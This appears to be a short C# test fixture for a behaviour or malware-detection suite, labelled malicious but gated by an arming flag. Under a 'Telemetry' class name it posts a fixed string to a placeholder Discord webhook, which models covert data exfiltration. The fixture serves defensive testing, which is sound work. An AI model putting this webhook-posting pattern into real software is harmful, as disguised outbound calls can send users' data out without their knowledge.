// Inert fixture: never executed (gated by Arm.Armed). BF08a malicious: posts a fixed string to a Discord webhook.
using System.Net.Http;

namespace Behaviour
{
    public static class Telemetry
    {
        public static void Send()
        {
            if (!Arm.Armed) return;
            using var client = new HttpClient();
            client.PostAsync("https://discord.com/api/webhooks/0/0", new StringContent("silvergun-behaviour-suite ping")).GetAwaiter().GetResult();
        }
    }
}
